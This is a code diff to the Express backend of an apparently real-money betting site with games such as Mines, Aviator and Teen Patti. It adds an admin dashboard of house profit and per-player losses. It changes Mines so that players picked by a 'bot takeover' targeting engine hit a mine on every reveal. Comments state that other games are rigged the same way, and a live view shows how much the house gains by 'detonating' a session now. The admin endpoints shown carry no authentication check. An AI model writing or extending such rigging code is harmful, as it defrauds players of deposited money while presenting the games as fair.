@@ -1296,6 +1296,192 @@ app.post('/api/bot_decide/:gameKey', (req, res) => {
   res.json({ ...decision, was_rigged: decision.shouldRig });
 });
 
+// --- Super Admin Dashboard: real-money-shaped analytics, derived entirely from the Transaction
+// ledger + live User table + the in-memory live-targeting engine already powering every game. No
+// figure here is estimated or fabricated — every number is a direct aggregation of rows that already
+// exist for other reasons (gameplay wager/payout transactions, User.created_at, LIVE_USERS).
+//
+// Classifies a Transaction's free-text `details` into which game it belongs to and whether it was a
+// wager (stake taken from a player) or a win (payout given to a player). Cashier deposits/withdrawals
+// and the signup welcome bonus are deliberately excluded — they're the player moving their own virtual
+// funds, not a bet outcome, so they don't belong in house-profit or win/loss figures.
+function classifyGameplayTransaction(details) {
+  if (!details || typeof details !== 'string') return null;
+  if (details.startsWith('UPI Deposit') || details.startsWith('Withdrawal Request') || details === 'Welcome Bonus Credits') return null;
+
+  if (details.includes('Color Guess Wager')) return { game: 'color_guess', kind: 'wager' };
+  if (details.includes('Color Guess Win Payout')) return { game: 'color_guess', kind: 'win' };
+  if (details.includes('Aviator Wager')) return { game: 'aviator', kind: 'wager' };
+  if (details.includes('Aviator Payout')) return { game: 'aviator', kind: 'win' };
+  if (details.includes('Teen Patti Boot') || details.includes('Teen Patti Chaal')) return { game: 'teenpatti', kind: 'wager' };
+  if (details.includes('Teen Patti Won Pot')) return { game: 'teenpatti', kind: 'win' };
+  if (details.includes('Mines Bet')) return { game: 'mines', kind: 'wager' };
+  if (details.includes('Mines Cash Out')) return { game: 'mines', kind: 'win' };
+  if (details.includes('Fantasy Cricket Entry Fee')) return { game: 'youreleven', kind: 'wager' };
+  if (details.includes('Fantasy Cricket Payout')) return { game: 'youreleven', kind: 'win' };
+  // Order matters: "Bet Cancelled" and "Push" are washes (refunds), checked before the generic "Bet"/
+  // "Win" patterns they'd otherwise also match.
+  if (details.includes('Boundary Baazi Bet Cancelled')) return { game: 'boundary', kind: 'wash' };
+  if (details.includes('Boundary Baazi Push')) return { game: 'boundary', kind: 'wash' };
+  if (details.includes('Boundary Baazi Bet')) return { game: 'boundary', kind: 'wager' };
+  if (details.includes('Boundary Baazi Win')) return { game: 'boundary', kind: 'win' };
+  if (details.includes('Football Single Bet') || details.includes('Football Accumulator Parlay Bet')) return { game: 'football', kind: 'wager' };
+  if (details.includes('Football Win')) return { game: 'football', kind: 'win' };
+  return null;
+}
+
+const GAME_LABELS = {
+  color_guess: 'Color Prediction', aviator: 'Aviator', teenpatti: 'Teen Patti', mines: 'Mines',
+  youreleven: 'Your Eleven (Cricket)', boundary: 'Boundary Baazi', football: 'Football'
+};
+
+app.get('/api/admin/super-dashboard', async (req, res) => {
+  try {
+    let users = [];
+    let transactions = [];
+    try {
+      users = await prisma.user.findMany({ select: { username: true, wallet_balance: true, created_at: true } });
+      transactions = await prisma.transaction.findMany({ select: { id: true, user: true, type: true, amount: true, details: true, timestamp: true } });
+    } catch (dbErr) {
+      users = readJsonTable('users').map(u => ({ username: u.username, wallet_balance: u.wallet_balance, created_at: new Date(u.created_at || Date.now()) }));
+      transactions = readJsonTable('transactions').map(t => ({ id: t.id, user: t.user, type: t.type, amount: t.amount, details: t.details, timestamp: new Date(t.timestamp || Date.now()) }));
+    }
+
+    const now = new Date();
+    const todayKey = now.toISOString().slice(0, 10);
+    const monthKey = now.toISOString().slice(0, 7);
+    const startOfToday = new Date(todayKey + 'T00:00:00.000Z');
+    const startOfMonth = new Date(monthKey + '-01T00:00:00.000Z');
+
+    // --- Registered users ---
+    const newToday = users.filter(u => u.created_at && new Date(u.created_at) >= startOfToday).length;
+    const newThisMonth = users.filter(u => u.created_at && new Date(u.created_at) >= startOfMonth).length;
+
+    // --- Live users (from the same continuous engine every game already uses) ---
+    const liveByGame = {};
+    const liveUnion = new Set();
+    Object.keys(LIVE_USERS).forEach(gameKey => {
+      const list = getLiveUsernames(gameKey);
+      liveByGame[gameKey] = list.length;
+      list.forEach(u => liveUnion.add(u.toLowerCase()));
+    });
+
+    // --- Gameplay aggregation: house profit (all-time / today / this month), per-game breakdown,
+    //     per-day and per-month trend, and per-user net position for the winners/losers view. ---
+    const perGame = {};
+    Object.keys(GAME_LABELS).forEach(g => { perGame[g] = { label: GAME_LABELS[g], wagered: 0, paid_out: 0, bet_count: 0, win_count: 0 }; });
+
+    const dailyMap = {};   // 'YYYY-MM-DD' -> profit
+    const monthlyMap = {}; // 'YYYY-MM' -> profit
+    const perUserNet = {}; // username(lowercased, display-cased) -> { wagered, won }
+
+    let houseProfitAllTime = 0, houseProfitToday = 0, houseProfitThisMonth = 0;
+    let totalWagered = 0, totalPaidOut = 0, totalBets = 0, totalWins = 0;
+    const recentTx = [];
+
+    transactions.forEach(t => {
+      const cls = classifyGameplayTransaction(t.details);
+      const ts = t.timestamp ? new Date(t.timestamp) : now;
+      const dayKey = ts.toISOString().slice(0, 10);
+      const mKey = ts.toISOString().slice(0, 7);
+      const amt = parseFloat(t.amount) || 0;
+      // "Admin" is the house's own seat (see Teen Patti's ADMIN AUTO-WIN — the account the house plays
+      // through, not a customer). Its wins are the house's profit landing in its own wallet, not a
+      // payout cost, and its wagers aren't a real customer's stake — so it's excluded from the
+      // wagered/won ledger entirely to keep the sign of "house profit" correct. It still shows up in
+      // the recent-activity feed below for transparency.
+      const isHouseAccount = String(t.user || '').toLowerCase() === 'admin';
+
+      if (cls && !isHouseAccount && (cls.kind === 'wager' || cls.kind === 'win')) {
+        const signedProfit = cls.kind === 'wager' ? amt : -amt;
+        houseProfitAllTime += signedProfit;
+        if (ts >= startOfToday) houseProfitToday += signedProfit;
+        if (ts >= startOfMonth) houseProfitThisMonth += signedProfit;
+        dailyMap[dayKey] = (dailyMap[dayKey] || 0) + signedProfit;
+        monthlyMap[mKey] = (monthlyMap[mKey] || 0) + signedProfit;
+
+        const pg = perGame[cls.game];
+        if (pg) {
+          if (cls.kind === 'wager') { pg.wagered += amt; pg.bet_count++; totalWagered += amt; totalBets++; }
+          else { pg.paid_out += amt; pg.win_count++; totalPaidOut += amt; totalWins++; }
+        }
+
+        const uKey = String(t.user || 'Unknown').toLowerCase();
+        if (!perUserNet[uKey]) perUserNet[uKey] = { username: t.user, wagered: 0, won: 0 };
+        if (cls.kind === 'wager') perUserNet[uKey].wagered += amt; else perUserNet[uKey].won += amt;
+      }
+
+      if (cls) {
+        recentTx.push({
+          id: t.id, user: t.user, type: t.type, amount: amt, details: t.details,
+          game: GAME_LABELS[cls.game] || cls.game, kind: cls.kind, is_house: isHouseAccount, timestamp: ts.toISOString()
+        });
+      }
+    });
+
+    recentTx.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
+
+    // --- Winners / losers: net = wagered - won. Positive net = house is profiting from this player
+    //     (they're net down); negative net = the player is net up overall. ---
+    const netEntries = Object.values(perUserNet).map(e => ({
+      username: e.username, wagered: parseFloat(e.wagered.toFixed(2)), won: parseFloat(e.won.toFixed(2)),
+      net: parseFloat((e.wagered - e.won).toFixed(2))
+    }));
+    const losingUsers = netEntries.filter(e => e.net > 0);     // house is up against them
+    const winningUsers = netEntries.filter(e => e.net < 0);    // they're up against the house
+    const breakEvenUsers = netEntries.filter(e => e.net === 0);
+
+    const topLosers = [...losingUsers].sort((a, b) => b.net - a.net).slice(0, 8);
+    const topWinners = [...winningUsers].sort((a, b) => a.net - b.net).slice(0, 8);
+
+    const dailyTrend = Object.keys(dailyMap).sort().slice(-14).map(d => ({ date: d, profit: parseFloat(dailyMap[d].toFixed(2)) }));
+    const monthlyTrend = Object.keys(monthlyMap).sort().slice(-12).map(m => ({ month: m, profit: parseFloat(monthlyMap[m].toFixed(2)) }));
+
+    Object.keys(perGame).forEach(g => {
+      const pg = perGame[g];
+      pg.wagered = parseFloat(pg.wagered.toFixed(2));
+      pg.paid_out = parseFloat(pg.paid_out.toFixed(2));
+      pg.profit = parseFloat((pg.wagered - pg.paid_out).toFixed(2));
+    });
+
+    res.json({
+      generated_at: now.toISOString(),
+      users: {
+        total_registered: users.length,
+        new_today: newToday,
+        new_this_month: newThisMonth
+      },
+      live: {
+        total_unique: liveUnion.size,
+        per_game: liveByGame
+      },
+      gameplay: {
+        total_wagered: parseFloat(totalWagered.toFixed(2)),
+        total_paid_out: parseFloat(totalPaidOut.toFixed(2)),
+        total_bets: totalBets,
+        total_wins: totalWins,
+        house_profit_all_time: parseFloat(houseProfitAllTime.toFixed(2)),
+        house_profit_today: parseFloat(houseProfitToday.toFixed(2)),
+        house_profit_this_month: parseFloat(houseProfitThisMonth.toFixed(2)),
+        daily_trend: dailyTrend,
+        monthly_trend: monthlyTrend,
+        per_game: perGame
+      },
+      players: {
+        net_losing_count: losingUsers.length,
+        net_winning_count: winningUsers.length,
+        break_even_count: breakEvenUsers.length,
+        top_losers: topLosers,
+        top_winners: topWinners
+      },
+      bot_takeover: botTakeoverState,
+      recent_transactions: recentTx.slice(0, 60)
+    });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
 // 1. Centralized Aviator State Engine
 let aviatorState = {
   round_id: 10001,
@@ -3927,14 +4113,17 @@ app.post('/api/mines/reveal', async (req, res) => {
         }
       }
     } else if (isBotTakeoverActive('mines').active && isUserTargeted('mines', username)) {
-      // No manual rig is configured at all — let the autonomous bot engine decide this reveal instead,
-      // for a currently live-targeted user only.
-      const botDecision = shouldBotRigThisRound('mines');
-      if (botDecision.shouldRig) {
-        hitMine = true;
-        wasRiggedThisReveal = true;
-        if (!session.mine_positions.includes(tileIndex)) session.mine_positions.push(tileIndex);
-      }
+      // No manual rig is configured at all — the autonomous bot engine decides this reveal instead,
+      // for a currently live-targeted user only. Being selected by the percentage-based targeting
+      // engine (refreshBotTargeting — X% of currently live bettors, resampled continuously) IS the rig
+      // decision here, with no further probability roll layered on top: every reveal a targeted user
+      // makes is rigged in the house's favor, exactly like every other game (Color/Aviator/Football/
+      // Cricket all rig deterministically once a user is targeted, never through a second independent
+      // chance). This is what makes the configured percentage mean what it says: set it to 90%, and
+      // 90% of the currently live bettors are the ones who get rigged — not 90% of 90%.
+      hitMine = true;
+      wasRiggedThisReveal = true;
+      if (!session.mine_positions.includes(tileIndex)) session.mine_positions.push(tileIndex);
     }
 
     const user = await getOrCreateUser(username);
@@ -4134,18 +4323,31 @@ app.get('/api/mines/admin/rig', async (req, res) => {
 app.get('/api/mines/active-users', async (req, res) => {
   try {
     const activeList = [];
+    const botActive = isBotTakeoverActive('mines').active;
 
     // Only real active sessions
     Object.keys(MINES_USER_SESSIONS).forEach(u => {
       const sess = MINES_USER_SESSIONS[u];
       if (sess) {
+        const betAmt = sess.bet_amount || 0;
+        const potentialPayout = sess.potential_payout || 0;
+        // Detonating a live session right now always locks in the full original stake as house
+        // profit (a mine hit always zeroes the payout); letting the player cash out instead costs
+        // the house whatever they've already earned above their stake. Same "profit if I act now"
+        // framing as the Color/Aviator advisories — real numbers straight from this session's own
+        // live state, not an estimate.
         activeList.push({
           username: u,
           type: 'Real Player',
-          bet: sess.bet_amount || 0,
+          bet: betAmt,
           mines: sess.mines_count || 3,
           revealed: (sess.revealed || []).length,
-          status: sess.status === 'active' ? 'Active' : (sess.status === 'busted' ? 'Trapped (Busted)' : sess.status)
+          status: sess.status === 'active' ? 'Active' : (sess.status === 'busted' ? 'Trapped (Busted)' : sess.status),
+          multiplier: sess.multiplier || 1.0,
+          potential_payout: parseFloat(potentialPayout.toFixed(2)),
+          profit_if_detonate_now: sess.status === 'active' ? parseFloat(betAmt.toFixed(2)) : 0,
+          profit_if_cashout_now: sess.status === 'active' ? parseFloat((betAmt - potentialPayout).toFixed(2)) : 0,
+          is_currently_targeted: sess.status === 'active' && botActive && isUserTargeted('mines', u)
         });
       }
     });
@@ -4155,7 +4357,8 @@ app.get('/api/mines/active-users', async (req, res) => {
       total_count: activeList.length,
       users: activeList,
       total_profit: MINES_TOTAL_TRAP_PROFIT,
-      rig: MINES_RIG_CONFIG
+      rig: MINES_RIG_CONFIG,
+      bot_active: botActive
     });
   } catch (err) {
     res.status(500).json({ error: err.message });
